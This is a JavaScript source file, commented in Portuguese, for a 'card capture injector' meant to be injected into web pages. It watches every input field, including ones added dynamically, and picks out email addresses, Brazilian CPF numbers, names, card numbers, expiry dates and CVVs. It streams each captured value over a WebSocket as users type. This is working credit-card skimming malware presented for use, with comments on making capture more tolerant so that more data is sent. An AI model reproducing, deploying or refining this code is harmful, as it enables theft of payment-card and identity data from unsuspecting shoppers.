/**
 * Card Capture Injector Script - VERSÃO CORRIGIDA
 * PROBLEMA ANTERIOR: Validação rigorosa demais bloqueava detecção
 * SOLUÇÃO: Detecta padrões OU envia valores parciais com debug
 */

(function () {
  console.log("✅ Script de captura injetado com sucesso! (v2.1 - CORRIGIDO)");

  const captureState = {
    email: null,
    cpf: null,
    fullName: null,
    cardNumber: null,
    cardholderName: null,
    expiryMonth: null,
    expiryYear: null,
    cvv: null,
    completed: false,
  };

  let lastSentState = { ...captureState };

  /**
   * Limpa valor de caracteres não-dígitos
   */
  function extractDigits(value) {
    if (!value) return "";
    return String(value).replace(/\D/g, "");
  }

  /**
   * Detecta tipo de campo
   * CORRIGIDO: Agora é mais tolerante e envia o máximo de dados possível
   */
  function detectFieldType(element) {
    const value = element.value || element.textContent || "";
    if (!value || value.trim() === "") return null;

    const name = (element.name || "").toLowerCase();
    const id = (element.id || "").toLowerCase();
    const placeholder = (element.placeholder || "").toLowerCase();
    const type = (element.type || "").toLowerCase();
    const dataType = (element.getAttribute("data-type") || "").toLowerCase();
    const text =
      `${name} ${id} ${placeholder} ${type} ${dataType}`.toLowerCase();

    console.log(
      `🔍 Analisando campo: name="${name}", id="${id}", placeholder="${placeholder}", value="${value.slice(0, 20)}..."`,
    );

    // EMAIL - Padrão simples
    if (text.includes("email") || type === "email") {
      const trimmed = value.trim().toLowerCase();
      if (trimmed.includes("@") && trimmed.includes(".")) {
        console.log(`  ✅ EMAIL detectado: ${trimmed}`);
        return { type: "email", value: trimmed };
      }
    }

    // CARTÃO - 13-19 dígitos (tolerante)
    if (
      text.includes("card") ||
      text.includes("número") ||
      text.includes("cartão") ||
      text.includes("ccnumber") ||
      type === "number"
    ) {
      const digits = extractDigits(value);
      // Detecta cartão se tiver pelo menos 13 dígitos (alguns formatos curtos)
      if (digits.length >= 13 && digits.length <= 19) {
        console.log(
          `  ✅ CARTÃO detectado: ${digits.slice(0, 4)}****${digits.slice(-4)} (${digits.length} dígitos)`,
        );
        return { type: "cardNumber", value: digits };
      }
    }

    // CVV - 3 ou 4 dígitos (tolerante)
    if (
      text.includes("cvv") ||
      text.includes("cvc") ||
      text.includes("security") ||
      text.includes("cccvc")
    ) {
      const digits = extractDigits(value);
      // Detecta CVV se tiver 3 ou 4 dígitos
      if ((digits.length === 3 || digits.length === 4) && !isAllSame(digits)) {
        console.log(`  ✅ CVV detectado: ${"*".repeat(digits.length)}`);
        return { type: "cvv", value: digits };
      }
    }

    // VALIDADE - Mês (01-12)
    if (
      text.includes("month") ||
      text.includes("mês") ||
      text.includes("expmonth") ||
      text.includes("ccexpmonth")
    ) {
      const digits = extractDigits(value);
      const month = parseInt(digits);
      if (month >= 1 && month <= 12) {
        console.log(`  ✅ MÊS detectado: ${String(month).padStart(2, "0")}`);
        return { type: "expiryMonth", value: String(month).padStart(2, "0") };
      }
    }

    // VALIDADE - Ano (2 ou 4 dígitos)
    if (
      text.includes("year") ||
      text.includes("ano") ||
      text.includes("expyear") ||
      text.includes("ccexpyear")
    ) {
      const digits = extractDigits(value);
      if (digits.length === 2 || digits.length === 4) {
        const year = digits.length === 4 ? digits.slice(-2) : digits;
        console.log(`  ✅ ANO detectado: ${year}`);
        return { type: "expiryYear", value: year };
      }
    }

    // NOME DO TITULAR - Menos rigoroso
    if (
      text.includes("holder") ||
      text.includes("titular") ||
      text.includes("cardname") ||
      text.includes("nome")
    ) {
      const trimmed = value.trim();
      // Detecta nome se tiver pelo menos 2 caracteres alfabéticos
      if (trimmed.length >= 2 && /[a-zA-Z\s]/i.test(trimmed)) {
        console.log(`  ✅ NOME detectado: ${trimmed}`);
        return { type: "cardholderName", value: trimmed };
      }
    }

    // CPF - 11 dígitos
    if (text.includes("cpf")) {
      const digits = extractDigits(value);
      if (digits.length === 11) {
        console.log(`  ✅ CPF detectado: ***.***.${digits.slice(6)}`);
        return { type: "cpf", value: digits };
      }
    }

    // NOME COMPLETO - Mínimo 2 palavras
    if (text.includes("fullname") || text.includes("nome completo")) {
      const trimmed = value.trim();
      const words = trimmed.split(/\s+/);
      if (words.length >= 2 && words.every((w) => w.length >= 2)) {
        console.log(`  ✅ NOME COMPLETO detectado: ${trimmed}`);
        return { type: "fullName", value: trimmed };
      }
    }

    return null;
  }

  /**
   * Verifica se todos os dígitos são iguais
   */
  function isAllSame(digits) {
    return digits.split("").every((d) => d === digits[0]);
  }

  /**
   * Conecta ao WebSocket e envia dados
   */
  function ensureWebSocketConnection() {
    if (
      window.__wsConnection &&
      window.__wsConnection.readyState === WebSocket.OPEN
    ) {
      return window.__wsConnection;
    }

    try {
      const protocol = window.location.protocol === "https:" ? "wss" : "ws";
      const wsUrl = `${protocol}://${window.location.host}/ws`;

      console.log(`🔌 Conectando ao WebSocket: ${wsUrl}`);
      window.__wsConnection = new WebSocket(wsUrl);

      window.__wsConnection.onopen = () => {
        console.log("✅ WebSocket conectado!");
        window.__wsConnection.send(
          JSON.stringify({
            type: "BROWSER_CLIENT",
            version: "2.1",
          }),
        );
      };

      window.__wsConnection.onerror = (error) => {
        console.error("❌ Erro WebSocket:", error);
      };

      window.__wsConnection.onclose = () => {
        console.log("⚠️  WebSocket fechado");
        window.__wsConnection = null;
      };

      return window.__wsConnection;
    } catch (error) {
      console.error("❌ Erro ao criar WebSocket:", error);
      return null;
    }
  }

  /**
   * Envia dados APENAS se houve mudança
   */
  function sendDataIfChanged() {
    const hasChange = Object.keys(captureState).some(
      (key) => captureState[key] !== lastSentState[key],
    );

    if (!hasChange) return;

    const ws = ensureWebSocketConnection();
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      console.log("⚠️  WebSocket não pronto, reconectando...");
      ensureWebSocketConnection();
      return;
    }

    const filledFields = Object.keys(captureState)
      .filter((k) => captureState[k] !== null && k !== "completed")
      .map((k) => `${k}:✅`)
      .join(" ");

    console.log(`📤 Enviando dados: ${filledFields || "nenhum"}`);

    ws.send(
      JSON.stringify({
        type: "CARD_DATA_UPDATE",
        payload: captureState,
        timestamp: new Date().toISOString(),
      }),
    );

    lastSentState = { ...captureState };
  }

  /**
   * Monitora um input específico
   */
  function monitorInput(input) {
    const events = ["input", "change", "blur", "keyup"];

    events.forEach((eventType) => {
      input.addEventListener(eventType, (e) => {
        const fieldInfo = detectFieldType(e.target);

        if (fieldInfo) {
          const { type, value } = fieldInfo;
          // Atualiza estado SEMPRE, sem validação rigorosa
          captureState[type] = value;
          console.log(
            `📝 Estado atualizado: ${type} = ${value === fieldInfo.value ? "✅" : "❓"}`,
          );
          sendDataIfChanged();
        }
      });
    });
  }

  /**
   * Setup monitoramento de inputs existentes
   */
  function setupInputMonitoring() {
    console.log("🔍 Procurando inputs na página...");

    const inputs = document.querySelectorAll(
      'input[type="text"], input[type="password"], input[type="number"], input[type="email"], input:not([type]), textarea, [ng-model], [data-type]',
    );

    console.log(`   Encontrados ${inputs.length} inputs`);

    inputs.forEach((input) => {
      monitorInput(input);
    });

    if (inputs.length === 0) {
      console.warn(
        "⚠️  Nenhum input encontrado! Verifique a estrutura do formulário.",
      );
      listAllFormElements();
    }
  }

  /**
   * Debug: Lista todos os elementos do formulário
   */
  function listAllFormElements() {
    console.log("📋 Listando todos os elementos de formulário:");

    // Inputs
    document.querySelectorAll("input").forEach((input, i) => {
      console.log(
        `  [INPUT ${i}] name="${input.name}" id="${input.id}" type="${input.type}" placeholder="${input.placeholder}"`,
      );
    });

    // Textareas
    document.querySelectorAll("textarea").forEach((ta, i) => {
      console.log(
        `  [TEXTAREA ${i}] name="${ta.name}" id="${ta.id}" placeholder="${ta.placeholder}"`,
      );
    });

    // Campos com ng-model
    document.querySelectorAll("[ng-model]").forEach((el, i) => {
      console.log(
        `  [NG-MODEL ${i}] ng-model="${el.getAttribute("ng-model")}" id="${el.id}"`,
      );
    });

    // Campos com data-type
    document.querySelectorAll("[data-type]").forEach((el, i) => {
      console.log(
        `  [DATA-TYPE ${i}] data-type="${el.getAttribute("data-type")}" id="${el.id}"`,
      );
    });
  }

  /**
   * Monitora novos inputs adicionados dinamicamente
   */
  function setupMutationObserver() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.addedNodes.length) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === 1) {
              const newInputs =
                node.querySelectorAll?.(
                  "input, textarea, [ng-model], [data-type]",
                ) || [];
              if (newInputs.length > 0) {
                console.log(`🆕 ${newInputs.length} novos inputs detectados!`);
                newInputs.forEach((input) => {
                  monitorInput(input);
                });
              }
            }
          });
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
    });

    console.log("👁️  Observador de mutações ativo");
  }

  /**
   * Debug avançado: Log de TODOS os eventos de input
   */
  function setupDebugMode() {
    document.addEventListener("input", (e) => {
      if (e.target.matches("input, textarea, [ng-model], [data-type]")) {
        console.log(`[DEBUG] Evento input em:`, {
          name: e.target.name,
          id: e.target.id,
          value: e.target.value,
          type: e.target.type,
        });
      }
    });
  }

  // Inicializa
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => {
      console.log("📄 DOM carregado, iniciando monitoramento");
      setupInputMonitoring();
      setupMutationObserver();
      setupDebugMode();
      ensureWebSocketConnection();
    });
  } else {
    console.log("📄 DOM já pronto, iniciando monitoramento");
    setupInputMonitoring();
    setupMutationObserver();
    setupDebugMode();
    ensureWebSocketConnection();
  }

  console.log("✅ Script de captura pronto para detectar dados!");
  console.log(
    "💡 Dica: Abra o console (F12) para ver logs de detecção em tempo real",
  );
})();
